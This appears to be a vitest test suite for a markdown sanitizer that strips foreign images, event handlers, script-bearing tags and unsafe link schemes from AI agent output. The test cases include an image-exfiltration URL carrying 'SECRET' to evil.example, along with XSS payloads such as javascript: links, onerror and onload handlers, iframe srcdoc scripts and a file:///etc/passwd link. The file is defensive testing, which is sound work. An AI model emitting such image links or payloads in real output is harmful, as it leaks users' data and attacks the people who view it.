// Covers: SEC-05 (image part): markdown images and links from agent output.
// Turns green: plan item 1.7 (markdown image exfil).
import { describe, it, expect } from 'vitest';
import { renderSafeMarkdown, sanitizeMarkdownHtml } from '../../src/core/safe-markdown';

const parse = (html: string) => {
  const el = document.createElement('div');
  el.innerHTML = html;
  return el;
};

describe('SEC-05: renderSafeMarkdown images', () => {
  it('SEC-05: foreign image has no src', async () => {
    const out = parse(await renderSafeMarkdown('![x](https://evil.example/a?ks=SECRET)'));
    expect(out.innerHTML).not.toContain('evil.example');
  });
  it('SEC-05: data: image is removed', async () => {
    const out = parse(await renderSafeMarkdown('![x](data:image/png;base64,AAAA)'));
    expect(out.querySelectorAll('img').length).toBe(0);
  });
  it('SEC-05: http image on a Kaltura host is removed', async () => {
    const out = parse(await renderSafeMarkdown('![x](http://cfvod.kaltura.com/a.png)'));
    expect(out.querySelectorAll('img').length).toBe(0);
  });
  it('SEC-05: https Kaltura CDN image is kept', async () => {
    const out = parse(await renderSafeMarkdown('![x](https://cfvod.kaltura.com/a.png)'));
    expect(out.querySelector('img')?.getAttribute('src')).toBe('https://cfvod.kaltura.com/a.png');
  });
  it('SEC-05: raw HTML in markdown stays text', async () => {
    const out = parse(await renderSafeMarkdown('<img src="https://evil.example/a" onerror="x()">'));
    expect(out.querySelectorAll('img').length).toBe(0);
  });
});

describe('SEC-05: sanitizeMarkdownHtml resource-loading tags and attributes', () => {
  const imgs = (html: string) => parse(sanitizeMarkdownHtml(html)).querySelectorAll('img').length;
  it.each([
    '<img src="https://evil.example/a">',
    '<img src="//evil.example/a">',
    '<img src="/relative.png">',
    '<img src="HTTPS://EVIL.EXAMPLE/a">',
    '<img src="https://cfvod.kaltura.com@evil.example/a">',
    '<img src="https://cfvod.kaltura.com.evil.example/a">',
    '<img src="https://user:pw@cfvod.kaltura.com/a">',
    '<img src="\n  https://evil.example/a">',
    '<img src="data:image/svg+xml,&lt;svg/&gt;">',
    '<img src="javascript:alert(1)">',
    '<img srcset="https://evil.example/a 1x">',
    '<img>',
  ])('SEC-05: removes %j', html => {
    expect(imgs(html)).toBe(0);
  });
  it('SEC-05: srcset is dropped from an allowed image', () => {
    const out = sanitizeMarkdownHtml('<img src="https://cfvod.kaltura.com/a.png" srcset="https://evil.example/a 2x">');
    expect(out).not.toContain('evil.example');
  });
  it('SEC-05: keeps the image and drops event handlers and style', () => {
    const out = sanitizeMarkdownHtml('<img src="https://cfvod.kaltura.com/a.png" onerror="x()" style="background:url(https://evil.example/a)">');
    expect(out).not.toMatch(/onerror|style|evil/);
  });
  it.each([
    '<svg><image href="https://evil.example/a"></image></svg>',
    '<svg onload="x()"></svg>',
    '<math><mi xlink:href="javascript:1">x</mi></math>',
    '<video poster="https://evil.example/p" src="https://evil.example/v"></video>',
    '<audio src="https://evil.example/v"></audio>',
    '<picture><source srcset="https://evil.example/a"><img src="https://evil.example/a"></picture>',
    '<iframe src="https://evil.example"></iframe>',
    '<iframe srcdoc="<script>1</script>"></iframe>',
    '<object data="https://evil.example/a"></object>',
    '<embed src="https://evil.example/a">',
    '<link rel="stylesheet" href="https://evil.example/a.css">',
    '<style>@import url(https://evil.example/a.css);</style>',
    '<script>1</script>',
    '<body background="https://evil.example/a">x</body>',
    '<table background="https://evil.example/a"><tr><td background="https://evil.example/a">x</td></tr></table>',
    '<div style="background:url(https://evil.example/a)">x</div>',
    '<p style="background-image:url(\'https://evil.example/a\')">x</p>',
    '<td style="text-align:left;background:url(https://evil.example/a)">x</td>',
    '<form action="https://evil.example/a"><button formaction="https://evil.example/a">x</button></form>',
    '<template><img src="https://evil.example/a"></template>',
    '<noscript><img src="https://evil.example/a"></noscript>',
    '<base href="https://evil.example/">',
    '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
  ])('SEC-05: no foreign resource survives %j', html => {
    const out = sanitizeMarkdownHtml(html);
    expect(out).not.toMatch(/evil|<script|<svg|<math|on\w+=/i);
  });
  it('SEC-05: table alignment style is kept', () => {
    expect(sanitizeMarkdownHtml('<table><tbody><tr><td style="text-align:center">x</td></tr></tbody></table>')).toContain('text-align:center');
  });
});

describe('SEC-05: sanitizeMarkdownHtml links', () => {
  const href = (html: string) => parse(sanitizeMarkdownHtml(html)).querySelector('a')?.getAttribute('href') ?? null;
  it.each([
    'javascript:alert(1)',
    'JAVASCRIPT:alert(1)',
    ' javascript:alert(1)',
    'java\nscript:alert(1)',
    'java\tscript:alert(1)',
    '\u0001javascript:alert(1)',
    'data:text/html,<script>1</script>',
    'vbscript:x',
    'blob:https://example.com/x',
    'file:///etc/passwd',
  ])('SEC-05: link href %j is removed', h => {
    expect(href(`<a href="${h}">x</a>`)).toBeNull();
  });
  it.each(['https://example.com/a', 'HTTP://example.com', 'mailto:a@b.example', '#section', '/path'])(
    'SEC-05: link href %j is kept',
    h => {
      expect(href(`<a href="${h}">x</a>`)).toBe(h);
    },
  );
  it('SEC-05: links get rel=noopener noreferrer', () => {
    expect(parse(sanitizeMarkdownHtml('<a href="https://example.com" target="_blank">x</a>')).querySelector('a')?.outerHTML).toBe(
      '<a href="https://example.com" rel="noopener noreferrer">x</a>',
    );
  });
  it('SEC-05: markdown javascript: link is not clickable', async () => {
    const out = parse(await renderSafeMarkdown('[x](javascript:alert(1)) and <a href="javascript:1">y</a>'));
    expect(out.querySelectorAll('a[href]').length).toBe(0);
  });
});

describe('SEC-05: sanitizeMarkdownHtml keeps normal markdown', () => {
  it('SEC-05: headings, lists, code and emphasis survive', async () => {
    const out = await renderSafeMarkdown('# T\n\n- **a**\n- `b`\n\n*c*');
    expect(out).toMatch(/<h1>T<\/h1>[\s\S]*<ul>[\s\S]*<strong>a<\/strong>[\s\S]*<code>b<\/code>[\s\S]*<em>c<\/em>/);
  });
});
